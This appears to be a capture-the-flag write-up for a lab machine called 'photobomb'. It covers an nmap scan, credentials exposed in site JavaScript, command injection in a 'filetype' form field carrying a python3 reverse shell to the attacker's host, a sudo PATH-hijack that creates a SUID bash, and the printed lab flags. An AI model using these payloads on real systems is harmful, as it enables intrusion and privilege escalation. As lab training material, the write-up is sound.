nmap scan:
```
┌─[✗]─[root@edu-virtualbox]─[/home/edu/HTB/photobomb]                                                           
└──╼ #nmap -A -p- 10.10.11.182 | tee scan.txt                                                   
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 15:23 CET                                                 
Nmap scan report for 10.10.11.182                                                               
Host is up (0.014s latency).                                                                    
Not shown: 65533 closed tcp ports (reset)                                                       
PORT   STATE SERVICE VERSION              
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                             
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)                                                                                                                                   
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)                                                 
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)          
80/tcp open  http    nginx 1.18.0 (Ubuntu)                                                      
|_http-title: Did not follow redirect to http://photobomb.htb/             
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                     

```

Subdomain scans and gobuster turned up nothing
In the source code, we saw `photobomb.js` being ran, and we found the credentials for the `/printer` subdirectory.

/photobomb.js
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

In `/printer`, we were stuck for a while, but I found the RCE in the `filetype` parameter:
```
photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;`ping 10.10.14.8 -c 5`&dimensions=30x20
```

For RCE, we used a `python3` reverse shell from revshells.:
```
photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;`export RHOST="10.10.14.8";export RPORT=5555;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`&dimensions=30x20
```

Once on the system:
```
wizard@photobomb:~$ sudo -l                                                                                                                                              
Matching Defaults entries for wizard on photobomb:                                                                                                                       
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                    

User wizard may run the following commands on photobomb:                            
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Notice the `SETENV`, it means you can set environment variables like `PATH`

`/opt/cleanup.sh`
```
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;

```
`find` was being called without a set path, so using the `SETENV` for `PATH` you can hijack the `find` executable.

```
wizard@photobomb:~$ nano find
wizard@photobomb:~$ chmod +x find 
```
`/home/wizard/find`:
```
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

And after running `sudo PATH="$PWD:$PATH" /opt/cleanup.sh`, `/tmp/root` appeared with the SUID bit set, so after executing `/tmp/bash -p` we were root.

```
bash-5.0# cat /home/wizard/user.txt 
12fa09822f4e11da5379c9e132633b10
bash-5.0# cat /root/root.txt 
e61a917ecd3b5166288f4647d6cc25ad
```